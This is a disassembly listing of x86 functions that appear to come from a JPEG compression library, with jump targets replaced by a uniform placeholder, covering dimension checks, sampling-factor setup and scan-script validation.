cmp edi [ ebx + 0x34 ]
jl r-xdata
mov edx [ esi + 0x10 ]
mov eax ebx
call sub_4654d4
add [ esp ] eax
inc edi
add esi 0x54
cmp [ ebx + 0xac ] 0x0
jne r-xdata
xor ebp ebp
jmp r-xdata
cmp [ ebx + 0xd9 ] 0x0
jne r-xdata
cmp [ ebx + 0xac ] 0x0
je r-xdata
cmp [ ebx + 0x30 ] 0x8
je r-xdata
cmp [ ebx + 0xd9 ] 0x0
je r-xdata
mov edx 0xc9
mov eax ebx
call sub_4656bc
jmp r-xdata
mov ebp 0x1
xor edi edi
mov esi [ ebx + 0x3c ]
jmp r-xdata
test ebp ebp
je r-xdata
mov edx 0xc2
mov eax ebx
call sub_4656bc
jmp r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
cmp edi [ ebx + 0x34 ]
jl r-xdata
mov edx 0xc1
mov eax ebx
call sub_4656bc
mov edx 0xc0
mov eax ebx
call sub_4656bc
jmp r-xdata
cmp [ esi + 0x14 ] 0x1
jg r-xdata
cmp [ esp ] 0x0
je r-xdata
xor ebp ebp
cmp [ esi + 0x18 ] 0x1
jle r-xdata
test ebp ebp
je r-xdata
inc edi
add esi 0x54
xor ebp ebp
mov eax [ ebx ]
mov [ eax + 0x14 ] 0x4a
xor edx edx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x4 ]
sub_465ad0
push ebx
mov ebx eax
push esi
push edi
push ebp
cmp [ ebx + 0xac ] 0x0
je r-xdata
xor ebp ebp
lea edi [ ebx + 0xed ]
jmp r-xdata
mov eax ebx
call sub_46568c
jmp r-xdata
cmp ebp [ ebx + 0xe9 ]
jl r-xdata
cmp [ ebx + 0xc0 ] 0x0
je r-xdata
cmp [ ebx + 0xd9 ] 0x0
mov esi [ edi ]
je r-xdata
mov eax ebx
call sub_465760
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_465690
xor ecx ecx
mov edx [ esi + 0x14 ]
mov eax ebx
call sub_4655b0
mov ecx 0x1
mov edx [ esi + 0x18 ]
mov eax ebx
call sub_4655b0
cmp [ ebx + 0x131 ] 0x0
jne r-xdata
mov ecx 0x1
mov edx [ esi + 0x18 ]
mov eax ebx
call sub_4655b0
jmp r-xdata
cmp [ ebx + 0x139 ] 0x0
jne r-xdata
inc ebp
add edi 0x4
xor ecx ecx
mov edx [ esi + 0x14 ]
mov eax ebx
call sub_4655b0
jmp r-xdata
sub_465b80
push ebx
push esi
push edi
mov edi eax
mov edx 0xd8
mov eax edi
call sub_465488
xor ebx ebx
lea esi [ edi + 0x40 ]
inc ebx
add esi 0x4
cmp ebx 0x4
jl r-xdata
mov edx ebx
mov eax edi
call sub_4654d4
cmp [ esi ] 0x0
je r-xdata
cmp [ edi + 0xac ] 0x0
jne r-xdata
mov edx 0xd9
mov eax edi
call sub_465488
pop edi
pop esi
pop ebx
retn
xor ebx ebx
lea esi [ edi + 0x50 ]
cmp [ esi + 0x10 ] 0x0
je r-xdata
xor ecx ecx
mov edx ebx
mov eax edi
call sub_4655b0
inc ebx
add esi 0x4
cmp ebx 0x4
jl r-xdata
mov ecx 0x1
mov edx ebx
mov eax edi
call sub_4655b0
cmp [ esi ] 0x0
je r-xdata
sub_465bf8
push ebx
mov ebx eax
mov eax ebx
push esi
mov ecx 0x18
mov edx 0x1
mov esi [ eax + 0x4 ]
call [ esi ]
mov esi eax
mov [ ebx + 0x151 ] esi
mov [ esi ] sub_465980
mov [ esi + 0x4 ] sub_4659c4
mov [ esi + 0x8 ] sub_4659f8
mov [ esi + 0xc ] sub_465ad0
mov [ esi + 0x10 ] sub_465b74
mov [ esi + 0x14 ] sub_465b80
pop esi
pop ebx
retn
sub_465c44
push ebx
mov ebx eax
push esi
push edi
cmp [ ebx + 0x1c ] 0x0
jbe r-xdata
mov eax [ ebx ]
mov [ eax + 0x14 ] 0x1f
mov eax ebx
mov edx [ eax ]
call [ edx ]
cmp [ ebx + 0x18 ] 0x0
jbe r-xdata
mov eax [ ebx ]
mov [ eax + 0x14 ] 0x28
mov [ eax + 0x18 ] 0xffdc
mov eax ebx
mov edx [ eax ]
call [ edx ]
cmp [ ebx + 0x18 ] 0xffdc
jle r-xdata
cmp [ ebx + 0x34 ] 0x0
jle r-xdata
cmp [ ebx + 0x30 ] 0x8
je r-xdata
mov ecx [ ebx ]
mov eax ebx
mov [ ecx + 0x14 ] 0x45
mov edx [ eax ]
call [ edx ]
mov eax [ ebx + 0x18 ]
imul [ ebx + 0x20 ]
mov edx eax
cmp eax edx
je r-xdata
cmp [ ebx + 0x20 ] 0x0
jg r-xdata
cmp [ ebx + 0x34 ] 0xa
jle r-xdata
mov eax [ ebx ]
mov [ eax + 0x14 ] 0xd
mov edx [ ebx + 0x30 ]
mov [ eax + 0x18 ] edx
mov eax ebx
mov edx [ eax ]
call [ edx ]
cmp [ ebx + 0x1c ] 0xffdc
jg r-xdata
mov [ ebx + 0xdd ] 0x1
mov [ ebx + 0xe1 ] 0x1
xor edi edi
mov esi [ ebx + 0x3c ]
jmp r-xdata
mov eax [ ebx ]
mov [ eax + 0x14 ] 0x18
mov edx [ ebx + 0x34 ]
mov [ eax + 0x18 ] edx
mov [ eax + 0x1c ] 0xa
mov eax ebx
mov edx [ eax ]
call [ edx ]
cmp edi [ ebx + 0x34 ]
jl r-xdata
mov eax [ esi + 0x8 ]
test eax eax
jle r-xdata
xor edi edi
mov esi [ ebx + 0x3c ]
jmp r-xdata
mov edx [ ebx ]
mov eax ebx
mov [ edx + 0x14 ] 0x10
mov edx [ eax ]
call [ edx ]
cmp eax 0x4
jg r-xdata
cmp edi [ ebx + 0x34 ]
jl r-xdata
mov eax [ esi + 0x8 ]
mov eax [ ebx + 0xdd ]
jmp r-xdata
cmp [ esi + 0xc ] 0x0
jle r-xdata
mov [ esi + 0x4 ] edi
inc edi
mov [ esi + 0x24 ] 0x8
mov eax [ ebx + 0x18 ]
mov ecx [ ebx + 0xdd ]
imul [ esi + 0x8 ]
shl ecx 0x3
add eax ecx
dec eax
cdq
idiv ecx
mov [ esi + 0x1c ] eax
mov eax [ ebx + 0x1c ]
mov ecx [ ebx + 0xe1 ]
imul [ esi + 0xc ]
shl ecx 0x3
add eax ecx
dec eax
cdq
idiv ecx
mov [ esi + 0x20 ] eax
mov eax [ ebx + 0x18 ]
mov ecx [ ebx + 0xdd ]
imul [ esi + 0x8 ]
add eax ecx
dec eax
cdq
idiv ecx
mov [ esi + 0x28 ] eax
mov eax [ ebx + 0x1c ]
mov ecx [ ebx + 0xe1 ]
imul [ esi + 0xc ]
add eax ecx
dec eax
cdq
idiv ecx
mov [ esi + 0x2c ] eax
mov [ esi + 0x30 ] 0x1
add esi 0x54
mov ecx [ ebx + 0xe1 ]
shl ecx 0x3
mov eax ecx
add eax [ ebx + 0x1c ]
dec eax
cdq
idiv ecx
mov [ ebx + 0xe5 ] eax
pop edi
pop esi
pop ebx
retn
mov ecx [ esi + 0xc ]
mov ecx [ ebx + 0xe1 ]
jmp r-xdata
mov [ ebx + 0xdd ] eax
mov edx [ ebx + 0xe1 ]
cmp edx [ esi + 0xc ]
jle r-xdata
cmp [ esi + 0xc ] 0x4
jle r-xdata
mov [ ebx + 0xe1 ] ecx
inc edi
add esi 0x54
mov ecx [ ebx + 0xdd ]
cmp ecx [ esi + 0x8 ]
jle r-xdata
sub_465e0c
push ebx
push esi
push edi
mov esi eax
push ebp
add esp 0xfffff5b8
cmp [ esi + 0xa0 ] 0x0
jg r-xdata
mov ecx [ esi + 0xa4 ]
mov [ esp ] ecx
mov eax [ esp ]
cmp [ eax + 0x14 ] 0x0
jne r-xdata
mov eax [ esi ]
xor ecx ecx
mov [ eax + 0x14 ] 0x11
mov edx [ esi ]
mov eax esi
mov [ edx + 0x18 ] ecx
mov edx [ eax ]
call [ edx ]
mov [ esi + 0xd9 ] 0x1
lea ebx [ esp + 0x48 ]
xor eax eax
mov [ esp + 0xc ] eax
jmp r-xdata
mov edx [ esp ]
cmp [ edx + 0x18 ] 0x3f
je r-xdata
mov eax [ esp + 0xc ]
cmp eax [ esi + 0x34 ]
jl r-xdata
xor edx edx
xor ecx ecx
mov [ esi + 0xd9 ] edx
mov [ esp + 0xc ] ecx
lea eax [ esp + 0x20 ]
jmp r-xdata
xor edi edi
jmp r-xdata
mov ecx [ esp + 0xc ]
cmp ecx [ esi + 0x34 ]
jl r-xdata
mov [ ebx ] 0xffffffff
add ebx 0x4
inc edi
cmp edi 0x40
jl r-xdata
inc [ esp + 0xc ]
mov [ esp + 0x4 ] 0x1
jmp r-xdata
xor edx edx
mov [ eax ] edx
inc [ esp + 0xc ]
add eax 0x4
mov eax [ esp + 0x4 ]
cmp eax [ esi + 0xa0 ]
jle r-xdata
mov eax [ esp ]
mov edx [ eax ]
mov [ esp + 0x8 ] edx
cmp [ esp + 0x8 ] 0x0
jle r-xdata
cmp [ esi + 0xd9 ] 0x0
je r-xdata
mov eax [ esi ]
mov [ eax + 0x14 ] 0x18
mov edx [ esp + 0x8 ]
mov [ eax + 0x18 ] edx
mov [ eax + 0x1c ] 0x4
mov eax esi
mov edx [ eax ]
call [ edx ]
cmp [ esp + 0x8 ] 0x4
jle r-xdata
xor eax eax
lea ebx [ esp + 0x20 ]
mov [ esp + 0xc ] eax
jmp r-xdata
xor edx edx
lea ebx [ esp + 0x48 ]
mov [ esp + 0xc ] edx
jmp r-xdata
mov eax [ esp ]
mov edx [ eax + 0x14 ]
mov [ esp + 0x10 ] edx
mov ecx [ esp ]
mov eax [ ecx + 0x18 ]
mov [ esp + 0x14 ] eax
mov edx [ esp ]
mov eax [ esp ]
mov ebp [ edx + 0x1c ]
mov edx [ eax + 0x20 ]
mov [ esp + 0x18 ] edx
cmp [ esi + 0xd9 ] 0x0
je r-xdata
mov ebx [ edi ]
test ebx ebx
jl r-xdata
xor ecx ecx
mov [ esp + 0xc ] ecx
mov eax [ esp ]
lea edi [ eax + 0x4 ]
mov eax [ esp + 0xc ]
cmp eax [ esp + 0x8 ]
jge r-xdata
mov ecx [ esp + 0xc ]
cmp ecx [ esi + 0x34 ]
jl r-xdata
mov ecx [ esp + 0xc ]
cmp ecx [ esi + 0x34 ]
jl r-xdata
cmp [ esp + 0x10 ] 0x0
jne r-xdata
cmp [ esp + 0x10 ] 0x0
jl r-xdata
mov eax [ esi ]
mov [ eax + 0x14 ] 0x11
mov edx [ esp + 0x4 ]
mov [ eax + 0x18 ] edx
mov eax esi
mov edx [ eax ]
call [ edx ]
cmp ebx [ esi + 0x34 ]
jl r-xdata
cmp [ ebx ] 0x0
jne r-xdata
add esp 0xa48
pop ebp
pop edi
pop esi
pop ebx
retn
cmp [ ebx ] 0x0
jge r-xdata
jmp r-xdata
mov eax [ esi ]
mov [ eax + 0x14 ] 0xf
mov edx [ esp + 0x4 ]
mov [ eax + 0x18 ] edx
mov eax esi
mov edx [ eax ]
call [ edx ]
cmp [ esp + 0x14 ] 0x3f
jne r-xdata
mov eax [ esi ]
mov [ eax + 0x14 ] 0xf
mov edx [ esp + 0x4 ]
mov [ eax + 0x18 ] edx
mov eax esi
mov edx [ eax ]
call [ edx ]
cmp [ esp + 0x10 ] 0x40
jge r-xdata
inc [ esp + 0xc ]
add edi 0x4
mov ecx [ esp + 0xc ]
cmp ecx [ esp + 0x8 ]
jl r-xdata
cmp ebx [ edi - 0x4 ]
jg r-xdata
cmp [ esp + 0xc ] 0x0
jle r-xdata
inc [ esp + 0xc ]
add ebx 0x4
mov eax [ esi ]
mov [ eax + 0x14 ] 0x2c
mov eax esi
mov edx [ eax ]
call [ edx ]
inc [ esp + 0xc ]
add ebx 0x100
mov eax [ esi ]
mov [ eax + 0x14 ] 0x2c
mov eax esi
mov edx [ eax ]
call [ edx ]
add [ esp ] 0x24
inc [ esp + 0x4 ]
mov ebx [ edi ]
cmp [ esp + ebx * 4 + 0x20 ] 0x0
je r-xdata
test ebp ebp
jne r-xdata
cmp [ esp + 0x8 ] 0x1
je r-xdata
cmp [ esp + 0x14 ] 0x0
je r-xdata
mov ecx [ esp + 0x14 ]
cmp ecx [ esp + 0x10 ]
jl r-xdata
mov eax [ esi ]
mov [ eax + 0x14 ] 0x11
mov edx [ esp + 0x4 ]
mov [ eax + 0x18 ] edx
mov eax esi
mov edx [ eax ]
call [ edx ]
mov [ esp + ebx * 4 + 0x20 ] 0x1
inc [ esp + 0xc ]
add edi 0x4
mov ecx [ esp + 0xc ]
cmp ecx [ esp + 0x8 ]
jl r-xdata
mov eax [ esi ]
mov [ eax + 0x14 ] 0x11
mov edx [ esp + 0x4 ]
mov [ eax + 0x18 ] edx
mov eax esi
mov edx [ eax ]
call [ edx ]
cmp [ esp + 0x18 ] 0x0
je r-xdata
xor ecx ecx
mov [ esp + 0xc ] ecx
mov eax [ esp ]
lea edx [ eax + 0x4 ]
mov [ esp + 0x1c ] edx
mov ecx [ esp + 0xc ]
cmp ecx [ esp + 0x8 ]
jge r-xdata
mov eax [ esi ]
mov [ eax + 0x14 ] 0xf
mov edx [ esp + 0x4 ]
mov [ eax + 0x18 ] edx
mov eax esi
mov edx [ eax ]
call [ edx ]
mov eax [ esi ]
mov [ eax + 0x14 ] 0xf
mov edx [ esp + 0x4 ]
mov [ eax + 0x18 ] edx
mov eax esi
mov edx [ eax ]
call [ edx ]
jmp r-xdata
cmp [ esp + 0x14 ] 0x40
jge r-xdata
xor ecx ecx
mov [ esp + 0xc ] ecx
mov eax [ esp ]
lea edi [ eax + 0x4 ]
mov eax [ esp + 0xc ]
cmp eax [ esp + 0x8 ]
jge r-xdata
mov eax [ esp + 0x1c ]
mov ebx [ eax ]
shl ebx 0x8
lea eax [ esp + 0x48 ]
add ebx eax
cmp [ esp + 0x10 ] 0x0
je r-xdata
test ebp ebp
jl r-xdata
mov edi [ esp + 0x10 ]
cmp edi [ esp + 0x14 ]
lea eax [ ebx + edi * 4 ]
mov ebx eax
jg r-xdata
cmp [ ebx ] 0x0
jge r-xdata
cmp ebp 0xd
jg r-xdata
inc [ esp + 0xc ]
add [ esp + 0x1c ] 0x4
mov eax [ esp + 0xc ]
cmp eax [ esp + 0x8 ]
jl r-xdata
cmp [ ebx ] 0x0
jge r-xdata
mov eax [ esi ]
mov [ eax + 0x14 ] 0xf
mov edx [ esp + 0x4 ]
mov [ eax + 0x18 ] edx
mov eax esi
mov edx [ eax ]
call [ edx ]
cmp [ esp + 0x18 ] 0x0
jl r-xdata
jmp r-xdata
cmp ebp [ ebx ]
jne r-xdata
test ebp ebp
je r-xdata
cmp [ esp + 0x18 ] 0xd
jle r-xdata
mov eax [ esi ]
mov [ eax + 0x14 ] 0xf
mov edx [ esp + 0x4 ]
mov [ eax + 0x18 ] edx
mov eax esi
mov edx [ eax ]
call [ edx ]
lea ecx [ ebp - 0x1 ]
cmp ecx [ esp + 0x18 ]
je r-xdata
mov ecx [ esp + 0x18 ]
inc edi
mov [ ebx ] ecx
add ebx 0x4
cmp edi [ esp + 0x14 ]
jle r-xdata
mov eax [ esi ]
mov [ eax + 0x14 ] 0xf
mov edx [ esp + 0x4 ]
mov [ eax + 0x18 ] edx
mov eax esi
mov edx [ eax ]
call [ edx ]
jmp r-xdata
cmp [ esp + 0x10 ] 0x0
jne r-xdata
sub_4661f4
push ebx
mov ebx eax
push esi
push edi
push ebp
mov edx [ ebx + 0xa4 ]
test edx edx
je r-xdata
cmp [ ebx + 0x34 ] 0x4
jle r-xdata
mov eax [ ebx + 0x141 ]
lea esi [ ebx + 0xed ]
mov ecx [ eax + 0x20 ]
shl ecx 0x2
lea ecx [ ecx + ecx * 8 ]
add ecx edx
mov edx ecx
mov eax [ edx ]
lea ecx [ edx + 0x4 ]
mov [ ebx + 0xe9 ] eax
xor eax eax
jmp r-xdata
mov ecx [ ebx + 0x34 ]
mov [ ebx + 0xe9 ] ecx
xor eax eax
lea edx [ ebx + 0xed ]
jmp r-xdata
mov eax [ ebx ]
mov [ eax + 0x14 ] 0x18
mov edx [ ebx + 0x34 ]
mov [ eax + 0x18 ] edx
mov [ eax + 0x1c ] 0x4
mov eax ebx
mov edx [ eax ]
call [ edx ]
cmp eax [ edx ]
jl r-xdata
cmp eax [ ebx + 0x34 ]
jl r-xdata
mov edi [ ecx ]
inc eax
mov ebp edi
lea edi [ ebp + edi * 4 ]
lea edi [ ebp + edi * 4 ]
shl edi 0x2
add edi [ ebx + 0x3c ]
mov [ esi ] edi
add esi 0x4
add ecx 0x4
mov eax [ edx + 0x14 ]
mov [ ebx + 0x131 ] eax
mov ecx [ edx + 0x18 ]
mov [ ebx + 0x135 ] ecx
mov eax [ edx + 0x1c ]
mov [ ebx + 0x139 ] eax
mov edx [ edx + 0x20 ]
mov [ ebx + 0x13d ] edx
jmp r-xdata
lea ecx [ eax + eax * 4 ]
lea ecx [ eax + ecx * 4 ]
inc eax
shl ecx 0x2
add ecx [ ebx + 0x3c ]
mov [ edx ] ecx
add edx 0x4
xor eax eax
xor edx edx
mov [ ebx + 0x131 ] eax
xor ecx ecx
mov [ ebx + 0x135 ] 0x3f
mov [ ebx + 0x139 ] edx
mov [ ebx + 0x13d ] ecx
pop ebp
pop edi
pop esi
pop ebx
retn
sub_4662e4
push ebx
mov ebx eax
push esi
push edi
push ecx
cmp [ ebx + 0xe9 ] 0x1
jne r-xdata
mov eax [ ebx + 0xe9 ]
test eax eax
jle r-xdata
mov ecx [ ebx + 0xed ]
mov eax [ ecx + 0x1c ]
mov [ ebx + 0xfd ] eax
mov edx [ ecx + 0x20 ]
mov [ ebx + 0x101 ] edx
xor edx edx
mov [ ecx + 0x34 ] 0x1
mov [ ecx + 0x38 ] 0x1
mov [ ecx + 0x3c ] 0x1
mov [ ecx + 0x40 ] 0x8
mov [ ecx + 0x44 ] 0x1
mov eax [ ecx + 0x20 ]
mov esi [ ecx + 0xc ]
div esi
mov eax edx
test eax eax
jne r-xdata
mov eax [ ebx ]
mov [ eax + 0x14 ] 0x18
mov edx [ ebx + 0xe9 ]
mov [ eax + 0x18 ] edx
mov [ eax + 0x1c ] 0x4
mov eax ebx
mov edx [ eax ]
call [ edx ]
cmp eax 0x4
jle r-xdata
mov [ ecx + 0x48 ] eax
xor edx edx
mov [ ebx + 0x105 ] 0x1
mov [ ebx + 0x109 ] edx
jmp r-xdata
mov eax esi
cmp esi [ ebx + 0xe9 ]
jl r-xdata
mov ecx [ ebx + 0xdd ]
shl ecx 0x3
mov eax ecx
add eax [ ebx + 0x18 ]
dec eax
cdq
idiv ecx
mov [ ebx + 0xfd ] eax
mov ecx [ ebx + 0xe1 ]
shl ecx 0x3
mov eax ecx
add eax [ ebx + 0x1c ]
dec eax
cdq
idiv ecx
mov [ ebx + 0x101 ] eax
xor ecx ecx
mov [ ebx + 0x105 ] ecx
xor esi esi
lea eax [ ebx + 0xed ]
mov [ esp ] eax
jmp r-xdata
mov eax [ ebx + 0xc4 ]
test eax eax
jle r-xdata
mov edx [ esp ]
mov ecx [ edx ]
mov eax [ ecx + 0x8 ]
mov [ ecx + 0x34 ] eax
mov eax [ ecx + 0xc ]
mov [ ecx + 0x38 ] eax
mov edx [ ecx + 0x34 ]
imul edx eax
mov [ ecx + 0x3c ] edx
xor edx edx
mov eax [ ecx + 0x34 ]
shl eax 0x3
mov [ ecx + 0x40 ] eax
mov eax [ ecx + 0x1c ]
mov edi [ ecx + 0x34 ]
div edi
mov eax edx
test eax eax
jne r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
imul [ ebx + 0xfd ]
cmp eax 0xffff
jl r-xdata
mov [ ecx + 0x44 ] eax
xor edx edx
mov eax [ ecx + 0x20 ]
mov edi [ ecx + 0x38 ]
div edi
mov eax edx
test eax eax
jne r-xdata
mov eax edi
mov [ ebx + 0xc0 ] eax
mov eax 0xffff
mov [ ecx + 0x48 ] eax
mov edi [ ecx + 0x3c ]
mov eax [ ebx + 0x105 ]
add eax edi
cmp eax 0xa
jle r-xdata
mov eax edi
mov eax edi
add edi 0xffffffff
test eax eax
jg r-xdata
mov edx [ ebx ]
mov eax ebx
mov [ edx + 0x14 ] 0xb
mov edx [ eax ]
call [ edx ]
jmp r-xdata
mov ecx [ ebx + 0x105 ]
inc [ ebx + 0x105 ]
mov [ ebx + ecx * 4 + 0x109 ] esi
inc esi
add [ esp ] 0x4
sub_466494
push ebx
mov ebx eax
push esi
mov esi [ ebx + 0x141 ]
mov eax [ esi + 0x14 ]
sub eax 0x1
jb r-xdata
mov eax ebx
call sub_4661f4
mov eax ebx
call sub_4662e4
cmp [ ebx + 0xa8 ] 0x0
jne r-xdata
je r-xdata
mov eax ebx
mov edx [ eax + 0x15d ]
call [ edx ]
mov edx [ ebx + 0xb0 ]
mov eax ebx
mov ecx [ eax + 0x161 ]
call [ ecx ]
cmp [ esi + 0x1c ] 0x1
mov edx 0x3
jg r-xdata
mov eax ebx
mov edx [ eax + 0x155 ]
call [ edx ]
mov eax ebx
mov edx [ eax + 0x159 ]
call [ edx ]
xor edx edx
mov eax ebx
mov ecx [ eax + 0x149 ]
call [ ecx ]
mov eax ebx
call sub_4661f4
mov eax ebx
call sub_4662e4
cmp [ ebx + 0x131 ] 0x0
jne r-xdata
dec eax
je r-xdata
mov eax ebx
mov ecx [ eax + 0x14d ]
call [ ecx ]
xor edx edx
mov eax ebx
mov ecx [ eax + 0x145 ]
call [ ecx ]
cmp [ ebx + 0xb0 ] 0x0
je r-xdata
add edx 0xfffffffd
mov edx 0x1
mov eax ebx
mov ecx [ eax + 0x161 ]
call [ ecx ]
mov edx 0x2
mov eax ebx
mov ecx [ eax + 0x14d ]
call [ ecx ]
xor edx edx
mov [ esi + 0xc ] edx
jmp r-xdata
cmp [ ebx + 0x139 ] 0x0
je r-xdata
cmp [ ebx + 0xb0 ] 0x0
jne r-xdata
jmp r-xdata
mov [ esi + 0xc ] 0x1
jmp r-xdata
xor eax eax
mov [ esi + 0xc ] eax
jmp r-xdata
mov ecx [ esi + 0x1c ]
dec ecx
cmp ecx [ esi + 0x18 ]
sete al
and eax 0x1
mov [ esi + 0x10 ] eax
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
cmp [ ebx + 0xac ] 0x0
je r-xdata
xor edx edx
mov eax ebx
mov ecx [ eax + 0x161 ]
call [ ecx ]
mov edx 0x2
mov eax ebx
mov ecx [ eax + 0x14d ]
call [ ecx ]
cmp [ esi + 0x20 ] 0x0
jne r-xdata
mov eax ebx
call sub_4661f4
mov eax ebx
call sub_4662e4
mov eax [ ebx ]
mov [ eax + 0x14 ] 0x2f
mov eax ebx
mov edx [ eax ]
call [ edx ]
pop esi
pop ebx
retn
mov edx [ esi + 0x18 ]
mov [ eax + 0xc ] edx
mov ecx [ esi + 0x1c ]
mov [ eax + 0x10 ] ecx
mov [ esi + 0x14 ] 0x2
inc [ esi + 0x18 ]
mov eax ebx
mov edx [ eax + 0x151 ]
call [ edx + 0xc ]
xor ecx ecx
mov [ esi + 0xc ] ecx
jmp r-xdata
mov eax ebx
mov edx [ eax + 0x151 ]
call [ edx + 0x8 ]
sub_466630
push ebx
mov ebx eax
mov eax [ ebx + 0x141 ]
xor edx edx
mov [ eax + 0xc ] edx
mov eax ebx
mov edx [ eax + 0x151 ]
call [ edx + 0x8 ]
mov eax ebx
mov edx [ eax + 0x151 ]
call [ edx + 0xc ]
pop ebx
retn
sub_466658
push ebx
push esi
mov esi eax
mov ebx [ esi + 0x141 ]
mov eax esi
mov edx [ eax + 0x161 ]
call [ edx + 0x8 ]
mov ecx [ ebx + 0x14 ]
sub ecx 0x1
jb r-xdata
mov [ ebx + 0x14 ] 0x2
cmp [ esi + 0xb0 ] 0x0
jne r-xdata
je r-xdata
inc [ ebx + 0x18 ]
pop esi
pop ebx
retn
inc [ ebx + 0x20 ]
jmp r-xdata
mov [ ebx + 0x14 ] 0x2
jmp r-xdata
dec ecx
je r-xdata
cmp [ esi + 0xb0 ] 0x0
je r-xdata
jmp r-xdata
inc [ ebx + 0x20 ]
mov [ ebx + 0x14 ] 0x1
sub_4666b4
push ebx
push esi
mov esi eax
push edi
mov eax esi
mov edi edx
mov edx 0x1
mov ecx 0x24
mov ebx [ eax + 0x4 ]
call [ ebx ]
mov ebx eax
xor eax eax
mov [ esi + 0x141 ] ebx
mov [ ebx ] sub_466494
mov [ ebx + 0x4 ] sub_466630
mov [ ebx + 0x8 ] sub_466658
mov [ ebx + 0x10 ] eax
mov eax esi
call sub_465c44
cmp [ esi + 0xa4 ] 0x0
je r-xdata
xor edx edx
mov [ esi + 0xd9 ] edx
mov [ esi + 0xa0 ] 0x1
mov eax esi
call sub_465e0c
jmp r-xdata
test edi edi
je r-xdata
mov [ esi + 0xb0 ] 0x1
cmp [ esi + 0xd9 ] 0x0
je r-xdata
xor ecx ecx
mov [ ebx + 0x14 ] ecx
cmp [ esi + 0xb0 ] 0x0
je r-xdata
mov eax [ esi + 0xa0 ]
mov [ ebx + 0x1c ] eax
mov ecx [ esi + 0xa0 ]
add ecx ecx
mov [ ebx + 0x1c ] ecx
jmp r-xdata
mov [ ebx + 0x14 ] 0x2
jmp r-xdata
mov [ ebx + 0x14 ] 0x1
jmp r-xdata
pop edi
pop esi
pop ebx
retn
xor eax eax
xor edx edx
mov [ ebx + 0x20 ] eax
mov [ ebx + 0x18 ] edx
cmp [ esi + 0xb0 ] 0x0
je r-xdata
sub_46677c
push ebx
cmp [ eax + 0xa8 ] 0x0
mov ecx [ eax + 0x145 ]
jne r-xdata
pop ebx
retn
xor ebx ebx
mov [ ecx + 0x8 ] ebx
xor ebx ebx
mov [ ecx + 0xc ] ebx
xor ebx ebx
mov [ ecx + 0x10 ] ebx
mov [ ecx + 0x14 ] edx
sub edx 0x1
jae r-xdata
mov edx [ eax ]
mov [ edx + 0x14 ] 0x4
mov ecx [ eax ]
call [ ecx ]
mov [ ecx + 0x4 ] sub_4667bc
pop ebx
retn
sub_4667bc
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov esi eax
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov ebx [ esi + 0x145 ]
jmp r-xdata
mov edx [ ebx + 0x8 ]
cmp edx [ esi + 0xe5 ]
jb r-xdata
cmp [ ebx + 0xc ] 0x8
jae r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
cmp [ ebx + 0xc ] 0x8
jne r-xdata
mov eax [ ebp + 0x8 ]
lea edx [ ebx + 0x18 ]
push eax
mov eax esi
push edx
lea ecx [ ebx + 0xc ]
push ecx
push 0x8
mov edi [ eax + 0x149 ]
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
call [ edi + 0x4 ]
lea edx [ ebx + 0x18 ]
mov eax esi
mov ecx [ eax + 0x14d ]
call [ ecx + 0x4 ]
test eax eax
jne r-xdata
cmp [ ebx + 0x10 ] 0x0
je r-xdata
cmp [ ebx + 0x10 ] 0x0
jne r-xdata
xor eax eax
mov [ ebx + 0xc ] eax
inc [ ebx + 0x8 ]
mov edx [ ebp - 0x8 ]
inc [ edx ]
xor ecx ecx
mov [ ebx + 0x10 ] ecx
mov eax [ ebp - 0x8 ]
dec [ eax ]
mov [ ebx + 0x10 ] 0x1
jmp r-xdata
sub_466854
push ebx
mov ebx eax
push esi
push edi
mov eax ebx
push ebp
push ecx
mov esi edx
mov edi [ eax + 0x4 ]
mov edx 0x1
mov ecx 0x40
call [ edi ]
mov [ ebx + 0x145 ] eax
mov [ eax ] sub_46677c
cmp [ ebx + 0xa8 ] 0x0
jne r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
test esi esi
je r-xdata
xor ecx ecx
lea edi [ eax + 0x18 ]
mov [ esp ] ecx
mov esi [ ebx + 0x3c ]
jmp r-xdata
mov eax [ ebx ]
mov [ eax + 0x14 ] 0x4
mov eax ebx
mov edx [ eax ]
call [ edx ]
jmp r-xdata
mov eax [ esp ]
cmp eax [ ebx + 0x34 ]
jl r-xdata
mov eax [ esi + 0xc ]
mov edx 0x1
shl eax 0x3
push eax
mov eax ebx
mov ecx [ esi + 0x1c ]
shl ecx 0x3
mov ebp [ eax + 0x4 ]
call [ ebp + 0x8 ]
mov [ edi ] eax
add edi 0x4
inc [ esp ]
add esi 0x54
sub_4668d8
push ebx
push esi
mov esi eax
test edx edx
mov ebx [ esi + 0x149 ]
je r-xdata
mov ecx [ esi + 0x1c ]
xor eax eax
mov [ ebx + 0x30 ] ecx
xor edx edx
mov [ ebx + 0x34 ] eax
mov [ ebx + 0x38 ] edx
mov ecx [ esi + 0xe1 ]
add ecx ecx
mov [ ebx + 0x3c ] ecx
pop esi
pop ebx
retn
mov eax [ esi ]
mov [ eax + 0x14 ] 0x4
mov eax esi
mov edx [ eax ]
call [ edx ]
sub_466914
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi ecx
mov [ ebp - 0x4 ] edx
mov esi eax
mov ebx edi
cmp ebx [ ebp + 0x8 ]
jge r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
push ebx
push 0x1
mov eax [ ebp - 0x4 ]
lea edx [ edi - 0x1 ]
push eax
mov eax esi
mov ecx esi
call sub_464490
inc ebx
cmp ebx [ ebp + 0x8 ]
jl r-xdata
sub_46694c
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov ebx eax
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi [ ebx + 0x149 ]
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
cmp eax [ ebp + 0x14 ]
jae r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
mov edx [ ebp + 0xc ]
mov ecx [ edx ]
